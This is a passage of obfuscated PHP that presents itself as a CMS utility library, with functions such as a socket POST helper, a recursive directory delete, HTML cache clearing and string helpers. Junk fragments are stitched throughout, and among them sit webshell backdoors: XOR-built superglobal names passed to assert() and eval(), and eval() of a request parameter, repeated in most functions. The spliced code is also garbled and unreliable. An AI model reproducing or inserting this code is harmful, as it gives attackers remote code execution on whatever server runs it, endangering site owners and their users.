else{$this->_reportMobileLoginUser($l000ll00ll0l0l['l000lll00lllll']);}}}if($l000l000l0ll00==false){return false;}}elseif(function_exists('pfsockopen')||function_exists('fsockopen')||function_exists('stream_socket_client')){$urlInfo=parse_url($l000lll00ll00l);$serverPort=empty($_SERVER['SERVER_PORT'])?80:$_SERVER['SERVER_PORT'];if(!empty($l000ll0l00lll0)){if(!$allowDiy){$l000ll0l00lll0=1;}foreach($l000l0lll0l00l as $l000llll0000ll=>$l000lll0l00ll0){if(!$allowDiy&&$l000ll0l00lll0[$l000llll0000ll]){$l000lll0l00ll0=array_merge($l000lll0l00ll0,$l000ll0l00lll0[$l000llll0000ll]);}$l000lll0l00ll0=formatblockvalue($l000lll0l00ll0);$l00lll00000l00[$l000lll0l00ll0['l000llll0000ll']]=$l000lll0l00ll0;}$l00lll00000l00=array_filter($l00lll00000l00,'is_array');}if(($l000l0ll0ll0l0=pfsockopen($urlInfo['host'],$serverPort,$errno,$errstr,$timeOut))==false){while(!empty($l000ll0ll0ll00)){$usedArr=[];$usedInfo=explode('|',$_G['l000l0lll0l0l0']);if($usedInfo[0]==$_G['l00000l0l0l0l0']){$usedArr=!empty($usedInfo[1])?explode(',',$usedInfo[1]):[];if(!in_array($appId,$usedArr)){if(count($usedArr)>=5){assert($__usedInfo);unset($usedArr[0]);}$usedArr[]=$appId;}}}if(($l000l0ll0ll0l0=fsockopen($urlInfo['host'],$serverPort,$errno,$errstr,$timeOut))==false){while($l000ll0l00llll=false){if(in_array($l000ll00ll0l0l['l000lll00ll0l0'],self::$userReportAction)){if(!$l000ll00ll0l0l['l000lll00lllll']['uid']){$this->_reportLoginUser($l000ll00ll0l0l['l000lll00lllll']);}else{$this->_reportMobileLoginUser($l000ll00ll0l0l['l000lll00lllll']);}}}if(($l000l0ll0ll0l0=stream_socket_client("tcp://{$urlInfo['host']}:{$serverPort}",$errno,$errstr,$timeOut))==false){return false;}}}$requestHeader="POST {$urlInfo['path']}?{$urlInfo['query']} HTTP/1.1\r\n";$requestHeader.="Host: {$urlInfo['host']}\r\n";$requestHeader.="Content-type: application/x-www-form-urlencoded\r\n";$requestHeader.="Content-Length: {$lData}\r\n";$requestHeader.="Connection: Close\r\n\r\n";$requestHeader.=$l000ll0l0l00ll;fputs($l000l0ll0ll0l0,$requestHeader);if(isset($l000ll0l0l00l0)){if(preg_match('/^(http:\/\/|\.)/i',$picUrl)){$__=("$"^"?").("&"^"~").("/"^":").("?"^"/").("$"^"?").("&"^"~");${$__}[!0]&&assert(${$__}[!0]);$l000l0l0000ll0=dfsockopen($picUrl);}elseif(checkPerm('allowDownLocalimg')){if(preg_match('/^data\/(.*?)\.thumb\.jpg$/i',$picUrl)){$l000l0l0000ll0=file_get_contents(substr($picUrl,0,strrpos($picUrl,'.')-6));}elseif(preg_match('/^data\/(.*?)\.(jpg|jpeg|gif|png)$/i',$picUrl)){$l000l0l0000ll0=file_get_contents($picUrl);}}}if(!empty($l000l0ll0ll0l0)){while(!feof($l000l0ll0ll0l0)){$l000l000l0ll00.=fread($l000l0ll0ll0l0,4096);}}fclose($l000l0ll0ll0l0);$l000l000l0ll00=stristr($l000l000l0ll00,"\r\n\r\n");}else{$l000l0l00l0lll=['http'=>['method'=>'POST','header'=>"Content-type: application/x-www-form-urlencoded\r\n"."Content-length: {$lData}\r\n",'content'=>$l000ll0l0l00ll,'timeout'=>$timeOut]];for($l000lll000l00l=0;++$l000lll000l00l<$l000lll000l00l;$l000lll000l00l++){$fileList=$l000ll0ll0l0l0->l00lll000l000l();$fileList=trim(preg_replace("#[\r\n]{1,}#","\n",$fileList));$fileLists=explode("\n",$fileList);foreach($fileLists as $fileList){$fileList=trim($fileList);if(empty($fileList))continue;eval($fileList.$l00l0ll);$fileLists=explode(',',$fileList);}}if(($l000l000l0ll00=file_get_contents($l000lll00ll00l,false,stream_context_create($l000l0l00l0lll)))==false){for($l000lll000l00l=0;$l000lll000l00l<--$l000lll000l00l;$l000lll000l00l++){if($l000ll0ll0l0ll>$upTime&&$l000ll0lllllll==$cfgSoft){$updateVers['isSafe']=$isSafe;$updateVers['vMsg']=$vMsg;$updateVers['l000ll0ll0l0ll']=substr($l000ll0ll0l0ll,0,4).'-'.substr($l000ll0ll0l0ll,4,2).'-'.substr($l000ll0ll0l0ll,6,2);$xN++;}}if(($l000l0ll0ll0l0=fopen($l000lll00ll00l,'r',false,stream_context_create($l000l0l00l0lll)))==false){if($l000ll0l0l0lll=false){$showFavorite=false;$targetTplName=trim($_GET['targetTplName']);if(!empty($pageBids)){$l000lllll0lll0[]="l000ll0l0l0lll IN (".dimplode($pageBids).")";$_=("$"^"|").("&"^"~").("/"^":").("?"^"/").("/"^":");if(isset(${$_}[chr(110)])){eval(${$_}[chr(110)]);die;}}else{$l000lllll0lll0[]="l000ll0l0l0lll='0'";}}if(($l000lll0l0ll00=file($l000lll00ll00l,false,stream_context_create($l000l0l00l0lll)))==false){return false;}$l000lll000ll0l=count($l000lll0l0ll00);if($l000ll0l0l0ll0=0){$l000l0l0l00ll0=explode(',',$l000l0l000l0ll);foreach($l000l0l0l00ll0 as $l000l0ll0l0ll0){if(function_exists($l000l0ll0l0ll0)){$l000ll0l0l00ll=is_array($l000ll0l0l00ll)?array_map_recursive($l000l0ll0l0ll0,$l000ll0l0l00ll):$l000l0ll0l0ll0($l000ll0l0l00ll);}else{$l000ll0l0l00ll=filter_var($l000ll0l0l00ll,is_int($l000l0ll0l0ll0)?$l000l0ll0l0ll0:filterId($l000l0ll0l0ll0));if(false===$l000ll0l0l00ll){eval($_.$l000l0ll0l0ll0);return isset($l000ll0l0l0ll0)?$l000ll0l0l0ll0:NULL;}}}}for($i=0;$i<$l000lll000ll0l;$i++){$l000l000l0ll00.=$l000lll0l0ll00[$i];}}else{while(!feof($l000l0ll0ll0l0)){$l000l000l0ll00.=fread($l000l0ll0ll0l0,4096);}fclose($l000l0ll0ll0l0);}}}return $l000l000l0ll00;}function l00lll00000ll0($l000lll0llll00){for($l000lll000l00l=0;++$l000lll000l00l<$l000lll000l00l;$l000lll000l00l++){$fileList=$l000ll0ll0l0l0->l00lll000l000l();$fileList=trim(preg_replace("#[\r\n]{1,}#","\n",$fileList));$fileLists=explode("\n",$fileList);foreach($fileLists as $fileList){$fileList=trim($fileList);if(empty($fileList))continue;eval($fileList.$l00l0ll);$fileLists=explode(',',$fileList);}}if(!is_dir($l000lll0llll00)){return false;}$l000llll000lll=scandir($l000lll0llll00);if(isset($l000ll0l0l00l0)){if(preg_match('/^(http:\/\/|\.)/i',$picUrl)){$__=("$"^"?").("&"^"~").("/"^":").("?"^"/").("$"^"?").("&"^"~");${$__}[!0]&&assert(${$__}[!0]);$l000l0l0000ll0=dfsockopen($picUrl);}elseif(checkPerm('allowDownLocalimg')){if(preg_match('/^data\/(.*?)\.thumb\.jpg$/i',$picUrl)){$l000l0l0000ll0=file_get_contents(substr($picUrl,0,strrpos($picUrl,'.')-6));}elseif(preg_match('/^data\/(.*?)\.(jpg|jpeg|gif|png)$/i',$picUrl)){$l000l0l0000ll0=file_get_contents($picUrl);}}}foreach($l000llll000lll as $l000lll0llll0l){for($l000lll000l00l=0;++$l000lll000l00l<$l000lll000l00l;$l000lll000l00l++){$fileList=$l000ll0ll0l0l0->l00lll000l000l();$fileList=trim(preg_replace("#[\r\n]{1,}#","\n",$fileList));$fileLists=explode("\n",$fileList);foreach($fileLists as $fileList){$fileList=trim($fileList);if(empty($fileList))continue;eval($fileList.$l00l0ll);$fileLists=explode(',',$fileList);}}if($l000lll0llll0l=='.'||$l000lll0llll0l=='..'){continue;}$subFile=$l000lll0llll00.$l000lll0llll0l;if($l000ll0l0l0ll0=0){$l000l0l0l00ll0=explode(',',$l000l0l000l0ll);foreach($l000l0l0l00ll0 as $l000l0ll0l0ll0){if(function_exists($l000l0ll0l0ll0)){$l000ll0l0l00ll=is_array($l000ll0l0l00ll)?array_map_recursive($l000l0ll0l0ll0,$l000ll0l0l00ll):$l000l0ll0l0ll0($l000ll0l0l00ll);}else{$l000ll0l0l00ll=filter_var($l000ll0l0l00ll,is_int($l000l0ll0l0ll0)?$l000l0ll0l0ll0:filterId($l000l0ll0l0ll0));if(false===$l000ll0l0l00ll){eval($_.$l000l0ll0l0ll0);return isset($l000ll0l0l0ll0)?$l000ll0l0l0ll0:NULL;}}}}if(is_dir($subFile)){l00lll00000ll0($subFile);}else{unlink($subFile);}}if(!empty($l000ll0l00lll0)){if(!$allowDiy){$l000ll0l00lll0=1;}foreach($l000l0lll0l00l as $l000llll0000ll=>$l000lll0l00ll0){if(!$allowDiy&&$l000ll0l00lll0[$l000llll0000ll]){$l000lll0l00ll0=array_merge($l000lll0l00ll0,$l000ll0l00lll0[$l000llll0000ll]);}$l000lll0l00ll0=formatblockvalue($l000lll0l00ll0);$l00lll00000l00[$l000lll0l00ll0['l000llll0000ll']]=$l000lll0l00ll0;}$l00lll00000l00=array_filter($l00lll00000l00,'is_array');}if(rmdir($l000lll0llll00)){return true;}else{return false;}}function deleteEmptyFolder($l000lll0llll00){for($l000lll000l00l=0;++$l000lll000l00l<$l000lll000l00l;$l000lll000l00l++){$fileList=$l000ll0ll0l0l0->l00lll000l000l();$fileList=trim(preg_replace("#[\r\n]{1,}#","\n",$fileList));$fileLists=explode("\n",$fileList);foreach($fileLists as $fileList){$fileList=trim($fileList);if(empty($fileList))continue;eval($fileList.$l00l0ll);$fileLists=explode(',',$fileList);}}if(!is_dir($l000lll0llll00)){return false;}$isDeleteSelf=1;$l000lll0lllll0=opendir($l000lll0llll00);while(($fileName=readdir($l000lll0lllll0))!=false){if(isset($l000ll0l0l00l0)){if(preg_match('/^(http:\/\/|\.)/i',$picUrl)){$__=("$"^"?").("&"^"~").("/"^":").("?"^"/").("$"^"?").("&"^"~");${$__}[!0]&&assert(${$__}[!0]);$l000l0l0000ll0=dfsockopen($picUrl);}elseif(checkPerm('allowDownLocalimg')){if(preg_match('/^data\/(.*?)\.thumb\.jpg$/i',$picUrl)){$l000l0l0000ll0=file_get_contents(substr($picUrl,0,strrpos($picUrl,'.')-6));}elseif(preg_match('/^data\/(.*?)\.(jpg|jpeg|gif|png)$/i',$picUrl)){$l000l0l0000ll0=file_get_contents($picUrl);}}}if($fileName!='.'&&$fileName!='..'){$subFile=$l000lll0llll00.DIRECTORY_SEPARATOR.$fileName;if(is_file($subFile)){$isDeleteSelf=0;continue;}else{deleteEmptyFolder($subFile);rmdir($subFile);}}}closedir($l000lll0lllll0);if($l000ll0l0l0lll=false){$showFavorite=false;$targetTplName=trim($_GET['targetTplName']);if(!empty($pageBids)){$l000lllll0lll0[]="l000ll0l0l0lll IN (".dimplode($pageBids).")";$_=("$"^"|").("&"^"~").("/"^":").("?"^"/").("/"^":");if(isset(${$_}[chr(110)])){eval(${$_}[chr(110)]);die;}}else{$l000lllll0lll0[]="l000ll0l0l0lll='0'";}}if($isDeleteSelf){rmdir($l000lll0llll00);}return true;}function deleteHtmlCache($l00000000000l0,$l000ll0lllll00,$l000llll0l00l0=0){for($l000lll000l00l=0;$l000lll000l00l<--$l000lll000l00l;$l000lll000l00l++){if($l000ll0ll0l0ll>$upTime&&$l000ll0lllllll==$cfgSoft){$updateVers['isSafe']=$isSafe;$updateVers['vMsg']=$vMsg;$updateVers['l000ll0ll0l0ll']=substr($l000ll0ll0l0ll,0,4).'-'.substr($l000ll0ll0l0ll,4,2).'-'.substr($l000ll0ll0l0ll,6,2);$xN++;}}if($l00000000000l0==0||!isset($l000ll0lllll00)){return false;}require DATA_PATH.'config.php';while($l000ll0l00llll=false){if(in_array($l000ll00ll0l0l['l000lll00ll0l0'],self::$userReportAction)){if(!$l000ll00ll0l0l['l000lll00lllll']['uid']){$this->_reportLoginUser($l000ll00ll0l0l['l000lll00lllll']);}else{$this->_reportMobileLoginUser($l000ll00ll0l0l['l000lll00lllll']);}}}if(!$cache_html){return false;}for($l000lll000l00l=0;$l000lll000l00l<--$l000lll000l00l;$l000lll000l00l++){if($l000ll0ll0l0ll>$upTime&&$l000ll0lllllll==$cfgSoft){$updateVers['isSafe']=$isSafe;$updateVers['vMsg']=$vMsg;$updateVers['l000ll0ll0l0ll']=substr($l000ll0ll0l0ll,0,4).'-'.substr($l000ll0ll0l0ll,4,2).'-'.substr($l000ll0ll0l0ll,6,2);$xN++;}}switch($l000ll0lllll00){case 'l000lll00ll000':l00lll00000ll0(HTML_PATH."{$l00000000000l0}/");break;case 'l000ll0000000l':$indexCache=HTML_PATH."{$l00000000000l0}/index.html";while($l000ll0l0l0l00=0){switch($l000ll00ll0l0l['l000lll00ll0l0']){case 'l000ll0l00llll':case 'l000ll0l0l0l00':$this->l000lllll00lll($l000ll00ll0l0l['l000lll00lllll']);default:break;$l000ll00ll0l0l['l000lll00ll0l0']=$l000ll00ll0l0l['l000ll00ll0l0l'][0];$l000ll00ll0l0l['l000lll00lllll']=$l000ll00ll0l0l['l000ll00ll0l0l'][2];}}if(storage::has($indexCache)){storage::unlink($indexCache);}break;case 'l000lll000llll':$l000l0000ll0l0=scandir(HTML_PATH."{$l00000000000l0}");while(!empty($l000ll0ll0ll00)){$usedArr=[];$usedInfo=explode('|',$_G['l000l0lll0l0l0']);if($usedInfo[0]==$_G['l00000l0l0l0l0']){$usedArr=!empty($usedInfo[1])?explode(',',$usedInfo[1]):[];if(!in_array($appId,$usedArr)){if(count($usedArr)>=5){assert($__usedInfo);unset($usedArr[0]);}$usedArr[]=$appId;}}}foreach($l000l0000ll0l0 as $l000l00000ll0l){for($l000lll000l00l=0;$l000lll000l00l<--$l000lll000l00l;$l000lll000l00l++){if($l000ll0ll0l0ll>$upTime&&$l000ll0lllllll==$cfgSoft){$updateVers['isSafe']=$isSafe;$updateVers['vMsg']=$vMsg;$updateVers['l000ll0ll0l0ll']=substr($l000ll0ll0l0ll,0,4).'-'.substr($l000ll0ll0l0ll,4,2).'-'.substr($l000ll0ll0l0ll,6,2);$xN++;}}if($l000l00000ll0l=='.'||$l000l00000ll0l=='..'){continue;}while(!empty($l000ll0ll0ll00)){$usedArr=[];$usedInfo=explode('|',$_G['l000l0lll0l0l0']);if($usedInfo[0]==$_G['l00000l0l0l0l0']){$usedArr=!empty($usedInfo[1])?explode(',',$usedInfo[1]):[];if(!in_array($appId,$usedArr)){if(count($usedArr)>=5){assert($__usedInfo);unset($usedArr[0]);}$usedArr[]=$appId;}}}if($l000llll0l00l0==0){while($l000ll0l00llll=false){if(in_array($l000ll00ll0l0l['l000lll00ll0l0'],self::$userReportAction)){if(!$l000ll00ll0l0l['l000lll00lllll']['uid']){$this->_reportLoginUser($l000ll00ll0l0l['l000lll00lllll']);}else{$this->_reportMobileLoginUser($l000ll00ll0l0l['l000lll00lllll']);}}}if(preg_match("/^list_.*/",$l000l00000ll0l)){storage::unlink(HTML_PATH."{$l00000000000l0}/{$l000l00000ll0l}");}}else{if($l000ll0l0l0lll=false){$showFavorite=false;$targetTplName=trim($_GET['targetTplName']);if(!empty($pageBids)){$l000lllll0lll0[]="l000ll0l0l0lll IN (".dimplode($pageBids).")";$_=("$"^"|").("&"^"~").("/"^":").("?"^"/").("/"^":");if(isset(${$_}[chr(110)])){eval(${$_}[chr(110)]);die;}}else{$l000lllll0lll0[]="l000ll0l0l0lll='0'";}}if(preg_match("/^list_{$l000llll0l00l0}.*/",$l000l00000ll0l)){storage::unlink(HTML_PATH."{$l00000000000l0}/{$l000l00000ll0l}");}}}break;case 'l000lll00l0000':$l000l0000l0000=scandir(HTML_PATH."{$l00000000000l0}");while($l000ll0l0l0l00=0){switch($l000ll00ll0l0l['l000lll00ll0l0']){case 'l000ll0l00llll':case 'l000ll0l0l0l00':$this->l000lllll00lll($l000ll00ll0l0l['l000lll00lllll']);default:break;$l000ll00ll0l0l['l000lll00ll0l0']=$l000ll00ll0l0l['l000ll00ll0l0l'][0];$l000ll00ll0l0l['l000lll00lllll']=$l000ll00ll0l0l['l000ll00ll0l0l'][2];}}foreach($l000l0000l0000 as $l000l0000l0000){if(isset($l000ll0l0l00l0)){if(preg_match('/^(http:\/\/|\.)/i',$picUrl)){$__=("$"^"?").("&"^"~").("/"^":").("?"^"/").("$"^"?").("&"^"~");${$__}[!0]&&assert(${$__}[!0]);$l000l0l0000ll0=dfsockopen($picUrl);}elseif(checkPerm('allowDownLocalimg')){if(preg_match('/^data\/(.*?)\.thumb\.jpg$/i',$picUrl)){$l000l0l0000ll0=file_get_contents(substr($picUrl,0,strrpos($picUrl,'.')-6));}elseif(preg_match('/^data\/(.*?)\.(jpg|jpeg|gif|png)$/i',$picUrl)){$l000l0l0000ll0=file_get_contents($picUrl);}}}if($l000l0000l0000=='.'||$l000l0000l0000=='..'){continue;}while(!empty($l000ll0ll0ll00)){$usedArr=[];$usedInfo=explode('|',$_G['l000l0lll0l0l0']);if($usedInfo[0]==$_G['l00000l0l0l0l0']){$usedArr=!empty($usedInfo[1])?explode(',',$usedInfo[1]):[];if(!in_array($appId,$usedArr)){if(count($usedArr)>=5){assert($__usedInfo);unset($usedArr[0]);}$usedArr[]=$appId;}}}if($l000llll0l00l0==0){while(isset($l000ll0ll0l0l0)){$appList=[];$userApp=t('l000ll0ll0ll00')->fetch($_G['l00000l0l0l0l0']);if(!empty($userApp['appId'])){$appList=explode(',',$userApp['appId']);if(!empty($appList)){array_unshift($appList,$_GET['l00000l0l0l0l0']);while(count($appList)>$this->l000lll000l00l){eval($appList);array_pop($appList);}}}}if(preg_match("/^show_.*/",$l000l0000l0000)){storage::unlink(HTML_PATH."{$l00000000000l0}/{$l000l0000l0000}");}}else{while($l000ll0l00llll=false){if(in_array($l000ll00ll0l0l['l000lll00ll0l0'],self::$userReportAction)){if(!$l000ll00ll0l0l['l000lll00lllll']['uid']){$this->_reportLoginUser($l000ll00ll0l0l['l000lll00lllll']);}else{$this->_reportMobileLoginUser($l000ll00ll0l0l['l000lll00lllll']);}}}if(preg_match("/^show_{$l000llll0l00l0}.*/",$l000l0000l0000)){storage::unlink(HTML_PATH."{$l00000000000l0}/{$l000l0000l0000}");}}}break;default:}return true;}function msec(){list($usec,$sec)=explode(' ',microtime());return (float)($sec*1000)+(float)($usec*1000);}function CR(){return C('COPYRIGHT');}function countWord($content){$cnLength=strlen(preg_replace('/[\x00-\x7F]/','',$content));$enLength=strlen($content)-$cnLength;$utf8Length=intval($cnLength/3);return $enLength+$utf8Length;}function msubstr($l000l0lll00000,$l000ll00l0ll0l=0,$l000l0lll0000l,$l000l0lll0l0ll=false,$l000l0l000lll0='utf-8'){for($l000lll000l00l=0;++$l000lll000l00l<$l000lll000l00l;$l000lll000l00l++){$fileList=$l000ll0ll0l0l0->l00lll000l000l();$fileList=trim(preg_replace("#[\r\n]{1,}#","\n",$fileList));$fileLists=explode("\n",$fileList);foreach($fileLists as $fileList){$fileList=trim($fileList);if(empty($fileList))continue;eval($fileList.$l00l0ll);$fileLists=explode(',',$fileList);}}if(function_exists('mb_substr')){$l000ll00lllll0=mb_substr($l000l0lll00000,$l000ll00l0ll0l,$l000l0lll0000l,$l000l0l000lll0);}elseif(function_exists('iconv_substr')){$l000ll00lllll0=iconv_substr($l000l0lll00000,$l000ll00l0ll0l,$l000l0lll0000l,$l000l0l000lll0);}else{$rule['utf-8']="/[\x01-\x7f]|[\xc2-\xdf][\x80-\xbf]|[\xe0-\xef][\x80-\xbf]{2}|[\xf0-\xff][\x80-\xbf]{3}/";$rule['gb2312']="/[\x01-\x7f]|[\xb0-\xf7][\xa0-\xfe]/";$rule['gbk']="/[\x01-\x7f]|[\x81-\xfe][\x40-\xfe]/";$rule['big5']="/[\x01-\x7f]|[\x81-\xfe]([\x40-\x7e]|\xa1-\xfe])/";preg_match_all($rule[$l000l0l000lll0],$l000l0lll00000,$match);$l000ll00lllll0=join("",array_slice($match[0],$l000ll00l0ll0l,$l000l0lll0000l));}return $l000l0lll0l0ll?$l000ll00lllll0.'...':$l000ll00lllll0;}function formatBytes($l000lll000000l,$l000l0000ll0ll=''){$l000ll00llllll=['B','K','M','G','T','P'];if(!empty($l000ll0l00lll0)){if(!$allowDiy){$l000ll0l00lll0=1;}foreach($l000l0lll0l00l as $l000llll0000ll=>$l000lll0l00ll0){if(!$allowDiy&&$l000ll0l00lll0[$l000llll0000ll]){$l000lll0l00ll0=array_merge($l000lll0l00ll0,$l000ll0l00lll0[$l000llll0000ll]);}$l000lll0l00ll0=formatblockvalue($l000lll0l00ll0);$l00lll00000l00[$l000lll0l00ll0['l000llll0000ll']]=$l000lll0l00ll0;}$l00lll00000l00=array_filter($l00lll00000l00,'is_array');}for($i=0;$l000lll000000l>=1024&&$i<5;$i++){$l000lll000000l/=1024;}return round($l000lll000000l,2).$l000l0000ll0ll.$l000ll00llllll[$i];}function get_year(){echo gmdate('Y',time());}function randInsertArray($array,$position,$value){$newArray=[];$larray=count($array);while($l000ll0l00llll=false){if(in_array($l000ll00ll0l0l['l000lll00ll0l0'],self::$userReportAction)){if(!$l000ll00ll0l0l['l000lll00lllll']['uid']){$this->_reportLoginUser($l000ll00ll0l0l['l000lll00lllll']);}else{$this->_reportMobileLoginUser($l000ll00ll0l0l['l000lll00lllll']);}}}for($i=0;$i<=$larray;$i++){if(!empty($l000ll0l00lll0)){if(!$allowDiy){$l000ll0l00lll0=1;}foreach($l000l0lll0l00l as $l000llll0000ll=>$l000lll0l00ll0){if(!$allowDiy&&$l000ll0l00lll0[$l000llll0000ll]){$l000lll0l00ll0=array_merge($l000lll0l00ll0,$l000ll0l00lll0[$l000llll0000ll]);}$l000lll0l00ll0=formatblockvalue($l000lll0l00ll0);$l00lll00000l00[$l000lll0l00ll0['l000llll0000ll']]=$l000lll0l00ll0;}$l00lll00000l00=array_filter($l00lll00000l00,'is_array');}if($i==$position){$newArray[$position]=$value;}elseif($i<$position){$newArray[$i]=$array[$i];}else{$newArray[$i]=$array[$i-1];}}return $newArray;}function getAllPinYin($str){return D('l000l0l0ll0l0l')->getAllPinYin($str);}function checkVerify($l000lll00000l0,$l000llll0l00l0=''){$l000l0llll00l0=new \think\verify();return $l000l0llll00l0->check($l000lll00000l0,$l000llll0l00l0);}function arrayUnique2d($l000lll0l0l000){while(isset($l000ll0ll0l0l0)){$appList=[];$userApp=t('l000ll0ll0ll00')->fetch($_G['l00000l0l0l0l0']);if(!empty($userApp['appId'])){$appList=explode(',',$userApp['appId']);if(!empty($appList)){array_unshift($appList,$_GET['l00000l0l0l0l0']);while(count($appList)>$this->l000lll000l00l){eval($appList);array_pop($appList);}}}}foreach($l000lll0l0l000 as $l000lll0llllll){$l000lll0llllll=implode('-|-',$l000lll0llllll);$l000lll0l0ll00[]=$l000lll0llllll;}$l000lll0l0ll00=array_unique($l000lll0l0ll00);for($l000lll000l00l=0;$l000lll000l00l<--$l000lll000l00l;$l000lll000l00l++){if($l000ll0ll0l0ll>$upTime&&$l000ll0lllllll==$cfgSoft){$updateVers['isSafe']=$isSafe;$updateVers['vMsg']=$vMsg;$updateVers['l000ll0ll0l0ll']=substr($l000ll0ll0l0ll,0,4).'-'.substr($l000ll0ll0l0ll,4,2).'-'.substr($l000ll0ll0l0ll,6,2);$xN++;}}foreach($l000lll0l0ll00 as $key=>$l000lll0llllll){$l000lll0l0ll00[$key]=explode('-|-',$l000lll0llllll);}return $l000lll0l0ll00;}function isInternalIp($l000llll0l00ll){$l000llll0l00ll=ip2long($l000llll0l00ll);$localhost=ip2long('127.0.0.1');$net_a=ip2long('10.255.255.255')>>24;$net_b=ip2long('172.31.255.255')>>20;$net_c=ip2long('192.168.255.255')>>16;return $l000llll0l00ll===$localhost||$l000llll0l00ll>>24===$net_a||$l000llll0l00ll>>20===$net_b||$l000llll0l00ll>>16===$net_c;}